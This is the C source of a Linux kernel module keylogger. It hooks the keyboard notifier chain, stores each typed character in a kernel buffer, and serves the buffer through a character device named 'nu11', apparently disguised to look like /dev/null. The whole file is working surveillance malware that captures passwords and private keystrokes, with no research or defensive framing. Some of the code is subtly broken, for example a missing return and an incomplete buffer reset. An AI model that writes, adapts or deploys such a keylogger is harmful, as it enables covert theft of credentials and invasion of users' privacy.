#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <asm/uaccess.h>
#include <asm/segment.h>
#include <linux/notifier.h>
#include <linux/mm.h>
#include <linux/kdev_t.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/types.h>
#include <linux/version.h>
#include <linux/errno.h>

// Module Info

#define SIZE_OF_MAP 96 
#define FILE_NAME "syslog.txt"
#define DEVICE_NAME "nu11"

/*============================== Declration ===========================*/
static int major = -1; // The Major Number that will be assigned to our Device Driver

//
static struct cdev mycdev;
static struct class *key_logger_class = NULL;
static int res;
//

// Keylogger Info

#define BUFFER_LEN 1024
char * keys_buffer[BUFFER_LEN]; // This buffer will contain all the logged keys
char ** keys_usr_ptr = keys_buffer; // Will be used for the char dev to iterate
char ** keys_buf_ptr = keys_buffer; // A pointer to start of the array

/*
 * Note: Our buffer will only be of size 1024. 
 * If the user typed more then 1024 valid characters,
 * the keys_buf_ptr would overflow.
 * To avoid this, we will use buf_pos to keep track of the
 * count of characters read.
 */
int buf_pos = 0; 

// KeysMap
struct Map {
	char key;	
	const char *value;
};

/*============================== Start of the key map ===========================*/
// See https://www.tcl.tk/man/tcl8.4/TkCmd/keysyms.html for full table.
struct Map map[SIZE_OF_MAP] = {
	{0x20,"[space]"},{0x21,"[exclam]"},{0x22,"[quotedbl]"},{0x23,"[numbersign]"},{0x24,"[dollarsign]"},{0x25,"[precentsign]"},{0x26,"[ampersand]"},{0x27,"[quoteright]"},{0x28,"[parenleft]"},{0x29,"[parenright]"},	
	{0x2a,"[astrisk]"},{0x2b,"[plussign]"},{0x2c,"[commasign]"},{0x2d,"[minussign]"},{0x2e,"[periodsign]"},{0x2f,"[slashsign]"},
	{0x30,"0"},{0x31,"1"},{0x32,"2"},{0x33,"3"},{0x34,"4"},{0x35,"5"},{0x36,"6"},{0x37,"7"},{0x38,"8"},{0x39,"9"},
	{0x3a,"[colon]"},{0x3b,"[semicolon]"},{0x3c,"[lesssign]"},{0x3d,"[equalsign]"},{0x3e,"[greatersign]"},{0x3f,"[questionsign]"},
	{0x40,"[atsign]"},{0x41,"A"},{0x42,"B"},{0x43,"C"},{0x44,"D"},{0x45,"E"},{0x46,"F"},{0x47,"G"},{0x48,"H"},{0x49,"I"},
	{0x4a,"J"},{0x4b,"K"},{0x4c,"L"},{0x4d,"M"},{0x4e,"N"},{0x4f,"O"},
	{0x50,"P"},{0x51,"Q"},{0x52,"R"},{0x53,"S"},{0x54,"T"},{0x55,"U"},{0x56,"V"},{0x57,"W"},{0x58,"X"},{0x59,"Y"},
	{0x5a,"Z"},{0x5b,"[bracketleft]"},{0x5c,"[backslash]"},{0x5d,"[bracketright]"},{0x5e,"[asciicircum]"},{0x5f,"[underscore]"},	
	{0x60,"[quoteleft]"},{0x61,"a"},{0x62,"b"},{0x63,"c"},{0x64,"d"},{0x65,"e"},{0x66,"f"},{0x67,"g"},{0x68,"h"},
	{0x69,"i"},{0x6a,"j"},{0x6b,"k"},{0x6c,"l"},{0x6d,"m"},{0x6e,"n"},{0x6f,"o"},	
	{0x70,"p"},{0x71,"q"},{0x72,"r"},{0x73,"s"},{0x74,"t"},{0x75,"u"},{0x76,"v"},{0x77,"w"},{0x78,"x"},{0x79,"y"},
	{0x7a,"z"},{0x7b,"[braceleft]"},{0x7c,"[bar]"},{0x7d,"[braceright]"},{0x7e,"[asciitilde]"},{0x7f,"[backspace]"}
};
/*============================== End of the key map ===========================*/

/*============================== Prototypes ===========================*/

static ssize_t dev_read(struct file *, char __user *, size_t,loff_t *);
static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification chain

// Function to get the value of key from the map
const char * get_value(char key){
	int i;
	for (i = 0 ; i < SIZE_OF_MAP; i++){
		if (key == map[i].key)
			return map[i].value;
	}	
}

// Setting the Device Driver read function
static struct file_operations fops ={
	.owner = THIS_MODULE,
	.read = dev_read
};

// Initializing the notifier_block
static struct notifier_block nb = {
	.notifier_call = keys_pressed
};

/*============================== The func to run on any keystorke ===========================*/

static int keys_pressed(struct notifier_block *nb, unsigned long action,void *data){

	struct keyboard_notifier_param *param = data;

	// We are only interesrted in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key. down return 1 if the key is pressed.
	if (action == KBD_KEYSYM && param->down){
		char c = param->value;
		
		// We will only log those key presses that actually represent an ASCII character.
		if (c == 0x01){
			*keys_buf_ptr = kvmalloc(strlen("[newline]")+1,__GFP_NOMEMALLOC);
			if (*keys_buf_ptr){
				strcpy(*keys_buf_ptr,"[newline]");
			}
			keys_buf_ptr++;
			buf_pos++;
		} else if (c >= 0x20 && c <= 0x7f){
			*keys_buf_ptr = kvmalloc(strlen(get_value(c))+1,__GFP_NOMEMALLOC);
			if (*keys_buf_ptr){
				strcpy(*keys_buf_ptr,get_value(c));
			}
			keys_buf_ptr++;
			buf_pos++;
		}

		// Check with buf_pos for buffer overflows
		if (buf_pos >= BUFFER_LEN){
			int i;
			for(i = 0 ; i < BUFFER_LEN ; i++)
				kvfree(keys_buffer[i]);
			buf_pos = 0;
			memset(keys_buffer, 0, BUFFER_LEN);
			keys_usr_ptr = keys_buffer;
			keys_buf_ptr = keys_buffer;
		}
	
	}
	return NOTIFY_OK; // This retrun value means that the notification was processed correctly. The notifier expects a return value from each callback function.
}

/*============================= Kerenl space to user space ===========================*/

// Character device driver read function 
// each time we "cat" the char device we
// should get one of the const char *
static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset){
	if (*offset > 0 || *keys_usr_ptr == 0)
		return 0;
	int len = strlen(*keys_usr_ptr);
	int i =0;
	int result = copy_to_user(buf, *keys_usr_ptr, len);
	if (result){
		pr_info("Couldn't copy all data to user space\n");
		return result;
	}
	keys_usr_ptr++;
	*offset = len;
	return len;
}

/*============================== Module init and exit ===========================*/
static int __init keyLogger_birth(void){
	res = alloc_chrdev_region(&major,0,1, DEVICE_NAME "_proc");
	if (res< 0){
		pr_info("keylog failed to register a major number\n");
		return major;
	}


	if((key_logger_class = class_create(THIS_MODULE,DEVICE_NAME))==NULL){
		pr_info("Class creation failed\n");
		unregister_chrdev_region(major,1);
		return -1;
	}

	if (device_create(key_logger_class, NULL, major, NULL, DEVICE_NAME) == NULL){
	
		pr_info("Divice creation failed\n");
		class_destroy(key_logger_class);
		unregister_chrdev_region(major, 1);
		return -1;
	}

	cdev_init(&mycdev, &fops);
	if (cdev_add(&mycdev,major,1) == -1){
		pr_info("Divice addition failed\n");
		device_destroy(key_logger_class,major);
		class_destroy(key_logger_class);
		unregister_chrdev_region(major, 1);
		return -1;
	}


	register_keyboard_notifier(&nb);	// This will register our keylogger to the notifier, so any key stroke will be notice by us.
	memset(keys_buffer, 0, BUFFER_LEN);
	return 0;
}

static void __exit keyLogger_death(void){
	device_destroy(key_logger_class,major);
	class_destroy(key_logger_class);
	unregister_chrdev_region(major, 1);
	unregister_chrdev(major, DEVICE_NAME);
	unregister_keyboard_notifier(&nb);
}

module_init(keyLogger_birth);
module_exit(keyLogger_death);
MODULE_LICENSE("GPL");
